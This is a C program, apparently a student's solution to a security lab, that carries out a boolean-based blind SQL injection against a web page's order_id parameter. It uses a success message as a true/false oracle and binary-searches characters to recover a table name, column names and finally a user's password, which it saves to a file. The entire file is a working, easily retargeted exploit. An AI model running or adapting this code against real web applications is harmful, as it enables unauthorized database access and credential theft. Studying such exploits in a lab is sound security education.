#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define TARGET_IP "192.168.1.202"
#define TARGET_PORT 80
#define STUDENT_ID "207777020"
#define TRUE_SIGNATURE "Your order has been sent!" // The signature string that indicates a TRUE response

//int global_query_count = 0;

// Returns 1 if TRUE (response contains signature), 0 if FALSE.
int check_condition(char *sql_condition) {
  int sockfd;
  struct sockaddr_in server_addr;
  char buffer[4096];
  char request[4096];
  char encoded_condition[2048];
  size_t total_received = 0;
  ssize_t n;

  // 1. URL Encode the condition
  int j = 0;
  for (int i = 0; sql_condition[i] != '\0'; i++) {
    if (sql_condition[i] == ' ') j += sprintf(&encoded_condition[j], "%%20");
    else if (sql_condition[i] == '\'') j += sprintf(&encoded_condition[j], "%%27");
    else if (sql_condition[i] == '%') j += sprintf(&encoded_condition[j], "%%25");
    else encoded_condition[j++] = sql_condition[i];
  }
  encoded_condition[j] = '\0';

  // 2. Build Request:
  // Uses "2 AND (condition)" logic.
  snprintf(request, sizeof(request),
           "GET /index.php?order_id=2%%20AND%%20(%s) HTTP/1.1\r\n"
           "Host: %s\r\n"
           "Connection: close\r\n"
           "\r\n", encoded_condition, TARGET_IP);

  // 3. Connect
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    exit(1);
  }

  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(TARGET_PORT);
  if (inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr) <= 0) {
    exit(1);
  }

  if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    exit(1);
  }

  //  global_query_count++; // FOR DEBUGGING QUERY COUNT

  // 4. Send Request
  if (send(sockfd, request, strlen(request), 0) < 0) {
    close(sockfd);
    exit(1);
  }

  // 5. Read Response
  while (total_received < sizeof(buffer) - 1) {
    n = recv(sockfd, buffer + total_received, sizeof(buffer) - 1 - total_received, 0);
    if (n <= 0) break;
    total_received += (size_t)n;
  }
  buffer[total_received] = '\0';
  close(sockfd);

  // 6. Check for TRUE signature
  if (strstr(buffer, TRUE_SIGNATURE)) {
    return 1; // TRUE
  }
  return 0; // FALSE
}

// --- BINARY SEARCH EXTRACTION ---
// Extracts a string char-by-char using ASCII 32-126 range
void extract_string(char *output_buffer, const char *base_query) {
  int char_index = 1;

  while (1) {
    int low = 32;
    int high = 126;
    int extracted_char = 0;

    // Optimization: Check if string ended (char > 0?)
    char check_valid[1024];
    snprintf(check_valid, sizeof(check_valid), "ASCII(SUBSTRING((%s),%d,1))>0", base_query, char_index);

    if (!check_condition(check_valid)) {
      break; // String ended
    }

    // Binary Search
    while (low <= high) {
      int mid = low + (high - low) / 2;
      char payload[1024];

      // Logic: Is char > mid?
      snprintf(payload, sizeof(payload),
               "ASCII(SUBSTRING((%s),%d,1))>%d", base_query, char_index, mid);

      if (check_condition(payload)) {
        low = mid + 1;
      } else {
        high = mid - 1;
      }
    }

    extracted_char = low; // Result
    output_buffer[char_index - 1] = (char)extracted_char;
    output_buffer[char_index] = '\0';

    // Safety limit (e.g., column names max 10, but buffer is larger)
    if (char_index >= 10) break;
    char_index++;
  }
}

int main() {
  char table_name[11] = {0};
  char id_col[11] = {0};
  char pwd_col[11] = {0};
  char password[11] = {0};

  // 1. Find Table Name
  extract_string(table_name, "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name LIKE '%usr%' LIMIT 1");

  // 2. Find ID Column
  char q_col_id[512];
  snprintf(q_col_id, sizeof(q_col_id), "SELECT column_name FROM information_schema.columns WHERE table_name='%s' AND column_name LIKE '%%id%%' LIMIT 1", table_name);
  extract_string(id_col, q_col_id);

  // 3. Find Password Column
  char q_col_pwd[512];
  snprintf(q_col_pwd, sizeof(q_col_pwd), "SELECT column_name FROM information_schema.columns WHERE table_name='%s' AND column_name LIKE '%%pwd%%' LIMIT 1", table_name);
  extract_string(pwd_col, q_col_pwd);

  // 4. Extract Password
  char q_final[512];
  snprintf(q_final, sizeof(q_final), "SELECT %s FROM %s WHERE %s=%s", pwd_col, table_name, id_col, STUDENT_ID);
  extract_string(password, q_final);

  // 5. Save to File
  char filename[64];
  snprintf(filename, sizeof(filename), "%s.txt", STUDENT_ID);
  FILE *f = fopen(filename, "w");
  if (f) {
    fprintf(f, "*%s*", password);
    fclose(f);
  } else {
    exit(1);
  }

//  printf("\n[DEBUG] Total Queries Used: %d\n", global_query_count);
  return 0;
}